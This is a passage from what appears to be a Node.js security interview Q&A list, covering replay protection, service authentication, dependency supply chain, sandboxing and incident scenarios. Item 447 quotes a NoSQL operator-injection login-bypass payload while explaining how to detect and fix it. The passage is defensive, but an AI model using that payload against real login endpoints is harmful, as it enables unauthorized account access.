- Verify signatures over the raw body with the provider's algorithm and `timingSafeEqual`.
- Check the timestamp in the signature to reject replays older than a few minutes, and store event IDs to drop duplicates.
- Validate the payload schema before using it.
- Respond fast and do the work in a queue, so slow processing cannot be used to tie up the server.
- Rate limit and log failed verifications.

## 416: How do you prevent replay attacks on signed requests?

Include a timestamp and a unique nonce or event ID in what is signed. On the server, reject requests outside a small time window (for example 5 minutes) and keep recently seen nonces in Redis until the window passes. Without both parts, a captured valid request can be sent again later.

```js
const age = Math.abs(Date.now() / 1000 - Number(timestamp));
if (age > 300) return res.sendStatus(401);
const fresh = await redis.set(`nonce:${eventId}`, "1", { NX: true, EX: 600 });
if (!fresh) return res.sendStatus(409);
```

## 417: How do you secure service-to-service calls inside a Node.js microservices system?

- Authenticate every call, even inside the private network: mTLS through a service mesh, or short-lived signed tokens (for example OAuth client credentials or workload identity tokens).
- Authorize per service: the billing service may call `POST /charges`, the email service may not.
- Pass the end user's identity in a signed form if downstream services need it, not as a plain header anyone could set.
- Apply network policies so only expected services can reach each other.

## 418: Why should internal services not trust headers like X-User-Id?

If the gateway adds `X-User-Id` after authentication and internal services trust it, any attacker who reaches an internal service directly (through SSRF, a compromised pod or a misrouted request) can set the header to any user. The gateway must strip incoming copies of such headers, and internal services should get identity in a signed token they verify themselves.

## 419: How do you design an API gateway's security responsibilities versus the services behind it?

The gateway handles things that are the same for all services: TLS, authentication of tokens, coarse rate limiting, request size limits, CORS and stripping internal headers. Services keep the business-specific parts: object-level authorization, input validation for their own data, and their own limits for expensive operations. Do not move all authorization into the gateway; it does not know which order belongs to which customer.

## 420: How would you approach securing a legacy Express 4 app you just inherited?

1. Inventory: routes, dependencies (`npm audit`, outdated packages), Node.js version, how it is deployed.
2. Quick wins: update Node.js to a supported LTS, add Helmet, fix cookie flags, add body size limits, set `trust proxy` correctly, remove `X-Powered-By`, add rate limits on auth.
3. Scan: SAST, secret scanning on the whole git history, DAST against staging.
4. Fix high-risk areas: auth, authorization on each route, injection points, file handling.
5. Plan the move to Express 5 and modern libraries, and add tests to keep fixes in place.

## 421: An endpoint takes 30 seconds on certain inputs and the CPU is at 100 percent. How do you investigate?

Suspect a ReDoS or another blocking loop. Reproduce with the logged input in staging and take a CPU profile (`node --cpu-prof` or the inspector's profiler) to find the hot function. Check event loop delay metrics around the time. If it is a regex, rewrite it or use `re2`, add an input length limit, and add a test with the bad input. Then search the codebase for similar patterns.

## 422: A security scanner reports your API allows any origin with credentials. How do you fix it safely?

Find where CORS is configured, often `cors({ origin: true, credentials: true })` or custom code that copies `req.headers.origin`. Replace it with an explicit allowlist from config, matched exactly. Check which front ends need access before rolling out, and deploy with logging of rejected origins for a few days to catch legit ones you missed. Add a test that a random origin gets no `Access-Control-Allow-Origin` header.

## 423: You find user passwords hashed with unsalted SHA-1 in an old database. What do you do?

You cannot reverse them, but you can wrap them right away: compute `argon2id(sha1Hash)` for every user and replace the stored value, marking those rows as "wrapped." At login, compute SHA-1 of the entered password, verify it against the wrapped hash, then rehash the plain password with Argon2id and clear the flag. Also treat the old hashes as possibly leaked: consider forcing resets for privileged accounts and check backups and logs that may still hold the old values.

## 424: How would you design rate limiting for an expensive AI or report generation endpoint?

Limit by cost, not request count: give each user a budget (tokens, CPU seconds, pages) per time window and charge each request its estimated cost, adjusting after it finishes. Add a concurrency limit per user so one user cannot fill all workers. Put the work in a queue with per-tenant fairness, and return 429 with `Retry-After` when the budget is used up.

## 425: How would you protect a public GraphQL API from abuse end to end?

- Persisted queries for first-party clients; strict cost limits for others.
- Depth, alias, directive and token limits at parse time.
- Pagination limits on list fields.
- Field-level authorization in the business layer.
- Rate limiting by query cost per user and IP.
- Error masking and no field suggestions in production.
- Timeouts per resolver and per request.
- Monitoring of slow and high-cost operations.

## 426: What are the main risks when running server-side JavaScript plugins written by customers?

Customer code could read other tenants' data, call internal services, mine cryptocurrency, loop forever or crash the host. `node:vm` does not stop any of this. Run plugins in a separate sandbox per tenant (microVM, gVisor container, or a WebAssembly runtime with no host access), with strict CPU, memory and time limits, no network or an egress allowlist, and a narrow, well-defined API to your platform that checks permissions on every call.

## 427: How can WebAssembly help sandbox untrusted logic in Node.js?

Wasm modules run in a memory-safe sandbox and can only use the functions you import into them. With no imports, a module cannot touch files, the network or your process. You still need to limit execution time (run it in a worker you can terminate) and memory (set a maximum on the Wasm memory). It is a good fit for running compiled customer rules or parsers, but not for running arbitrary JavaScript.

## 428: What security checks would you add before deploying a Node.js service to production?

- Supported Node.js LTS and no critical known CVEs in the image.
- `npm ci` from a lockfile, no dev dependencies in the image.
- Non-root user, read-only file system, dropped capabilities.
- Secrets from a manager, none in the image or repo.
- Security headers, TLS, cookie flags and CORS checked in staging.
- Logging of security events and alerts wired up.
- Health and metrics endpoints not public.
- Inspector and debug flags off.

## 429: How do you keep secrets out of Node.js heap snapshots and core dumps?

Heap snapshots and core dumps contain everything in memory, including keys and tokens. Restrict who can trigger and download them, store them encrypted with short retention, and turn off automatic core dumps in production containers unless needed. Keep secrets in as few places as possible (one config object, not copied into many strings), and avoid `--heapsnapshot-signal` in production unless access to the signal is controlled.

## 430: Why is running npm start or npx at runtime a supply chain concern in production containers?

`npx some-tool` may download and run a package at container start if it is not installed, pulling an unpinned version from the internet into production. Even `npm start` adds the npm CLI and its config to the runtime attack surface. Run the app with `node` directly, install everything at build time from the lockfile, and block outbound access to the npm registry from production.

## 431: How do you verify the integrity of what you deploy?

Build once in CI, produce an image with a digest, sign it (for example with cosign using keyless signing) and attach provenance and an SBOM. Deploy by digest, not tag, and have the cluster check signatures and provenance with an admission controller (Kyverno, Sigstore policy-controller) before running. Then what runs in production is exactly what CI built from the reviewed source.

## 432: What is a software bill of materials used for during an incident like Log4Shell or a malicious npm version?

When a new critical vulnerability or a malicious package version is announced, you need to know within minutes which services include it. With SBOMs stored for every deployed image, you can query for the package name and version across all services instead of checking repos by hand. Tools like Dependency-Track or GUAC ingest SBOMs and answer these queries continuously.

## 433: How do you handle a zero-day in Node.js itself before a patch is available?

Read the advisory or report to see what triggers it (an HTTP header pattern, a specific API, a TLS feature). Apply mitigations outside the runtime: block the pattern at the WAF or proxy, turn off the affected feature, restrict network access to the affected service. Watch for exploitation in logs. Prepare patched images so you can deploy the moment the security release lands.

## 434: What role does a WAF play in front of a Node.js app, and what are its limits?

A web application firewall blocks known attack patterns (common SQL injection and XSS payloads, bad bots, request smuggling forms) and lets you add virtual patches quickly during incidents. It cannot understand your business logic, so it does not stop authorization bugs, and attackers bypass generic rules with encoding tricks. Treat it as a helpful outer layer, not a replacement for secure code.

## 435: How do you make sure security fixes do not regress later?

Write a test for every fixed vulnerability that uses the original attack input: an injection payload, a cross-user request, a ReDoS string with a time limit. Keep these in the normal test suite, so they run on every change. For classes of bugs, add a lint or Semgrep rule that blocks the pattern from coming back anywhere in the codebase.

## 436: How would you test for timing leaks in an authentication endpoint?

Send many requests for existing and non-existing users (or right and almost-right tokens) and compare response time distributions, not single measurements. Statistical tests or tools that repeat requests thousands of times help remove network noise. Run them close to the server to reduce jitter. If the distributions differ in a stable way, fix the code path so both cases do the same work.

## 437: How do you check that security headers are always sent, including on error responses?

Write integration tests that call several routes, including a 404, a validation error and a forced 500, and check headers like `Content-Security-Policy`, `Strict-Transport-Security` and `X-Content-Type-Options`. Middleware order matters: Helmet must run before routes and before anything that can end the response early, like static file serving or body parser errors.

```js
test("500 responses still have CSP", async () => {
  const res = await request(app).get("/__test/throw");
  assert.equal(res.status, 500);
  assert.ok(res.headers["content-security-policy"]);
});
```

## 438: How should a Node.js app shut down to avoid security and data problems?

On `SIGTERM`, stop accepting new connections, let in-flight requests finish with a time limit, close WebSocket connections cleanly, flush logs and audit events, and close database and queue connections. Killing the process mid-request can leave half-finished transactions or lose audit records. Set a hard timeout so a stuck request cannot keep the old version running forever.

```js
process.on("SIGTERM", () => {
  server.close(async () => {
    await Promise.allSettled([db.end(), logger.flush?.()]);
    process.exit(0);
  });
  server.closeIdleConnections();
  setTimeout(() => process.exit(1), 10_000).unref();
});
```

## 439: How do you design audit logging for admin actions in a Node.js back end?

Record who (admin ID, impersonation info), what (action, target resource, before and after values for important fields), when, from where (IP, user agent, request ID) and the result. Write audit events in the same transaction as the change (an outbox table) so they cannot be lost, then ship them to append-only storage. Give admins no way to edit or delete their own audit entries.

## 440: How would you secure a Node.js CLI tool your company distributes to developers?

- Publish it with provenance through trusted publishing.
- Keep dependencies few and pinned.
- Do not run install scripts.
- Store credentials in the OS keychain (not plain files), and use device-flow OAuth instead of asking for passwords.
- Check update downloads with signatures.
- Never log tokens and redact them in debug output.
- Validate any config files it reads, since they may come from cloned repos the user does not control.

## 441: How can a malicious repository attack a developer who runs a Node.js tool inside it?

Tools that load config from the current folder can run code from it: `.npmrc` settings, `package.json` scripts, `eslint.config.js`, `vite.config.js`, Babel and test configs are all JavaScript or can trigger scripts. Opening an untrusted repo and running `npm install` or a dev command can execute the attacker's code. Inspect unknown repos first, use editor restricted modes, and run them in containers or VMs.

## 442: How do you limit damage from a compromised developer laptop in a Node.js team?

- Keep production secrets off laptops; use SSO and short-lived credentials for cloud access.
- Require hardware-key MFA for GitHub, npm and the cloud console.
- Protect main branches with required reviews, so one account cannot push code to production alone.
- Use separate, scoped npm tokens and prefer trusted publishing.
- Run dependency installs in dev containers where possible.
- Have a fast process to revoke all sessions and tokens of one person.

## 443: How would you build an internal allowlist or review process for new npm dependencies?

Use a private registry proxy (Artifactory, Verdaccio, GitHub Packages) that all builds go through. New packages or major versions need a quick review: purpose, maintainers, install scripts, provenance, license and transitive dependency count. Automated tools check new versions of approved packages for suspicious changes, and a minimum release age delays brand-new versions. Keep the process light, or developers will route around it.

## 444: What is the trade-off between pinning exact dependency versions and using ranges?

Exact pins in `package.json` (plus a lockfile) make every change explicit and reviewable, but you must update often or you fall behind on security fixes. Ranges let fixes flow in on the next lockfile refresh, but also let a hijacked patch release in. For apps, the lockfile already pins, so ranges in `package.json` plus automated, reviewed update PRs work well. For libraries you publish, use ranges, because pins cause duplicate copies for your users.

## 445: How do you protect an app against a compromised CDN-hosted front-end library?

Self-host critical scripts from your own origin, or use Subresource Integrity with exact versions so a changed file is refused. Set a CSP that limits script sources. Watch third-party scripts on payment and login pages closely, since PCI DSS 4.0 requires an inventory and integrity checks for scripts on payment pages.

## 446: How do you evaluate the security of a new Node.js framework or runtime alternative?

Check the security policy and track record: is there a clear disclosure process, are advisories published with CVEs, how fast are fixes released? Look at the default settings (body limits, header defaults, error output), whether it has a documented threat model, how plugins are isolated, and how active the maintainer team is. Also check how well your existing scanners and tools understand it.

## 447: Scenario: logs show many requests with payloads like {"$gt": ""} to the login endpoint. What does this tell you and what do you do?

Someone is trying NoSQL operator injection to bypass login. Check if any of these requests succeeded: look for logins without a matching valid password check, or for users logged in from those IPs. Make sure the endpoint validates that email and password are strings, and turn on `sanitizeFilter` or similar guards. Block or rate limit the source, and add a test with this payload so it stays fixed.

## 448: Scenario: a dependency update suddenly adds a postinstall script that downloads a binary. How do you respond?

Stop the update from merging and check whether it ran anywhere, for example on developer machines or CI. Compare the new version with the old one and check the source repo, release notes and provenance to see if it is a legit change (some tools download prebuilt binaries) or a hijack. If it looks malicious, report it to npm and the maintainers, rotate any secrets on machines where it ran, pin the last safe version and consider install scripts off by default going forward.

## 449: Scenario: you must add file preview for PDFs uploaded by users. What security design do you propose?

Upload to a quarantine bucket through a presigned URL with size and type limits. A worker checks magic bytes, scans for malware and renders preview images in a sandboxed container with no network access and strict time and memory limits. Store previews and originals under random keys, serve them from a separate domain through short-lived signed URLs with `Content-Disposition` and a restrictive CSP, and check that the requesting user may access the document every time.

## 450: If you had one week to improve the security of a mid-size Node.js API, what would you prioritize?

1. **Day 1:** update to a supported Node.js LTS, fix critical and high dependency CVEs, turn on secret scanning and rotate anything found.
2. **Day 2:** review authentication: password hashing, session and cookie flags, MFA for admins, rate limits on login and reset.
3. **Day 3:** review authorization on every route, especially object ownership checks, and add tests for the riskiest ones.
4. **Day 4:** input validation on all endpoints, body size limits, and a search for injection-prone code (`exec`, raw SQL, `eval`).
5. **Day 5:** Helmet and CSP, CORS cleanup, error handling without leaks, security event logging with alerts, and a container running as non-root.

Then write down what is left as a backlog with owners.
